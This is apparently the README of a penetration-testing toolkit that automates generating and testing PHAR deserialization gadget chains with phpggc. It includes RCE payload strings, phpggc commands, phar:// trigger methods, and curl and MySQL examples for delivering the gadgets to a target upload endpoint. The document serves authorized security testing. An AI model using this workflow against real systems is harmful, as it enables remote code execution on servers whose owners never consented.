# PHAR Gadget Chain Automation Toolkit

This toolkit automates the creation and testing of PHAR deserialization gadget chains using phpggc.

## Overview

**Purpose**: Automate penetration testing for PHAR deserialization vulnerabilities

**Components**:
1. **phar_generator.sh** - Generates all possible PHAR gadgets from phpggc (run locally)
2. **phar_checker.sh** - Tests PHAR files on target system (run on debug machine)
3. **phar_checker.py** - Python version of the checker (more flexible)
4. **phar_test_simple.php** - Simple PHP test harness
5. **phar_test_advanced.php** - Advanced PHP test harness with multiple methods

## Prerequisites

### Local Machine (Generator)
- phpggc installed in current directory (`./phpggc`)
- Bash shell
- zip utility

### Debug/Test Machine (Checker)
- PHP installed
- Bash or Python 3
- Access to test the target application

## Part 1: Generate PHAR Gadgets (Local Machine)

### Usage

```bash
chmod +x phar_generator.sh
./phar_generator.sh
```

### What It Does

1. Queries phpggc for all available gadget chains
2. For each gadget, generates multiple PHAR variants:
   - RCE Command payloads: `touch /tmp/poc`
   - RCE PHP code payloads: `file_put_contents("/tmp/poc","pwned");`
   - RCE Function call payloads: `system 'touch /tmp/poc'`
   - File operation payloads
   - Generic fallback payloads

3. Creates a timestamped directory with all PHARs
4. Compresses everything to a ZIP file

### Output

```
phar_gadgets_20260217_143022/
├── Bitrix_RCE1_cmd.phar
├── Bitrix_RCE1_phpcode.phar
├── CakePHP_RCE1_cmd.phar
├── CakePHP_RCE2_func.phar
└── README.txt

phar_gadgets_20260217_143022.zip
```

### Example Output

```
[+] PHAR Gadget Generator
[+] Output directory: phar_gadgets_20260217_143022

[*] Fetching gadget list...
[+] Found 156 gadget chains

[1/156] Processing: Bitrix/RCE1
  [✓] RCE Command
  [✓] RCE PHP Code
  [✓] Successfully created PHAR(s)

================================
[+] Generation Complete!
================================
Total Gadgets: 156
Successful: 142
Failed: 14
Output Directory: phar_gadgets_20260217_143022
ZIP File: phar_gadgets_20260217_143022.zip
================================
```

## Part 2: Test PHAR Gadgets (Debug Machine)

### Method A: Using Bash Checker

```bash
chmod +x phar_checker.sh

# Option 1: With custom PHP deserialization command
./phar_checker.sh ./phar_gadgets 'php phar_test_simple.php'

# Option 2: With advanced test harness
./phar_checker.sh ./phar_gadgets 'php phar_test_advanced.php'

# Option 3: With your own vulnerable application
./phar_checker.sh ./phar_gadgets 'php /var/www/vulnerable_app.php'
```

### Method B: Using Python Checker

```bash
chmod +x phar_checker.py

# Using $PHAR placeholder
python3 phar_checker.py ./phar_gadgets "php phar_test_simple.php $PHAR"

# Direct command
python3 phar_checker.py ./phar_gadgets "php phar_test_advanced.php"
```

### What It Does

1. Scans directory for all `.phar` files
2. For each PHAR:
   - Removes `/tmp/poc` if it exists
   - Executes the PHP deserialization command
   - Waits for execution
   - Checks if `/tmp/poc` was created
3. Reports success/failure for each PHAR
4. Stops and prompts when a successful gadget is found
5. Saves detailed results to a timestamped file

### Example Output

```
╔════════════════════════════════════════╗
║     PHAR Gadget Chain Checker         ║
╚════════════════════════════════════════╝

[*] PHAR Directory: ./phar_gadgets
[*] Results File: phar_test_results_20260217_143500.txt
[*] Indicator File: /tmp/poc

[+] Found 284 PHAR files to test

[1/284] Testing: Bitrix_RCE1_cmd.phar
  [*] Executing: php phar_test_simple.php ./phar_gadgets/Bitrix_RCE1_cmd.phar
  [✗] Failed - /tmp/poc not created

[2/284] Testing: CakePHP_RCE1_cmd.phar
  [*] Executing: php phar_test_simple.php ./phar_gadgets/CakePHP_RCE1_cmd.phar
  [✓] SUCCESS! /tmp/poc was created
  [!] VULNERABLE GADGET FOUND!
  [?] Continue testing other PHARs? (y/n):
```

## PHP Test Harnesses

### Simple Test Harness

**File**: `phar_test_simple.php`

```bash
php phar_test_simple.php gadget.phar
```

Uses `file_get_contents(phar://)` to trigger deserialization.

### Advanced Test Harness

**File**: `phar_test_advanced.php`

```bash
# Test all methods
php phar_test_advanced.php gadget.phar

# Test specific method
php phar_test_advanced.php gadget.phar 1  # file_get_contents
php phar_test_advanced.php gadget.phar 2  # file_exists
php phar_test_advanced.php gadget.phar 3  # fopen
php phar_test_advanced.php gadget.phar 4  # stat/is_file
php phar_test_advanced.php gadget.phar 5  # include
```

Tests multiple deserialization vectors:
- file_get_contents(phar://)
- file_exists(phar://)
- fopen(phar://)
- is_file/stat(phar://)
- include(phar://)

## Integration with Your Application

### Option 1: Standalone Testing

Use the provided PHP test harnesses to test PHARs independently.

### Option 2: Integration with Vulnerable App

If you have access to a vulnerable application:

```bash
# Direct integration
./phar_checker.sh ./phar_gadgets 'php /path/to/vulnerable_app.php'

# With arguments
./phar_checker.sh ./phar_gadgets 'php /path/to/app.php --deserialize'
```

### Option 3: Custom Integration

Modify the checker to call your application's deserialization endpoint:

```bash
# HTTP request example
./phar_checker.sh ./phar_gadgets 'curl -X POST -F "file=@$PHAR" http://target/upload'

# Database insertion example  
./phar_checker.sh ./phar_gadgets 'mysql -e "INSERT INTO uploads VALUES (LOAD_FILE(\"$PHAR\"));"'
```

## Results Files

Both checkers create timestamped result files:

```
phar_test_results_20260217_143500.txt
```

Contains:
- Test date and configuration
- Success/failure for each PHAR
- Execution status
- Summary statistics
- List of successful gadgets

## Success Indicator

**All payloads are designed to create `/tmp/poc` as a success indicator.**

If `/tmp/poc` exists after testing a PHAR, that gadget chain is vulnerable.

## Tips for Effective Testing

1. **Start with Simple Tests**: Use `phar_test_simple.php` first
2. **Try Multiple Methods**: Use `phar_test_advanced.php` for comprehensive testing
3. **Check Permissions**: Ensure PHP can write to `/tmp/`
4. **Monitor Execution**: Watch for errors in PHP execution
5. **Test Incrementally**: If too many PHARs, test in batches
6. **Review Results**: Check the results file for patterns

## Troubleshooting

### No PHARs Created
- Verify phpggc is in current directory
- Check phpggc works: `./phpggc -l`
- Try manually: `./phpggc Symfony/RCE1 'id' -p phar -o test.phar`

### /tmp/poc Not Created
- Check PHP has write permissions to `/tmp/`
- Verify deserialization is actually happening
- Try different deserialization methods
- Check PHP error logs

### Timeouts
- Increase timeout in checker scripts
- Check for infinite loops in gadget chains
- Monitor system resources

### False Negatives
- Some gadgets may require specific PHP versions
- Some require specific library versions
- Test with multiple PHP versions if possible

## Security Notes

⚠️ **For Authorized Testing Only**

This toolkit is for:
- Penetration testing with explicit authorization
- Security research on your own systems
- Vulnerability assessment in controlled environments

Do NOT use on systems you don't own or have permission to test.

## Workflow Summary

```
┌─────────────────┐
│ Local Machine   │
│                 │
│ 1. Generate     │
│    PHARs with   │──────┐
│    phar_        │      │
│    generator.sh │      │
└─────────────────┘      │
                         │ Transfer ZIP
                         ▼
                  ┌─────────────────┐
                  │ Debug Machine   │
                  │                 │
                  │ 2. Extract ZIP  │
                  │                 │
                  │ 3. Run checker  │
                  │    (bash/python)│
                  │                 │
                  │ 4. Check        │
                  │    /tmp/poc     │
                  │                 │
                  │ 5. Review       │
                  │    results      │
                  └─────────────────┘
```

## License

For security research and authorized penetration testing only.

---

**Author**: 0xbugatti
**Purpose**: PHAR deserialization vulnerability assessment
**Date**: February 2026
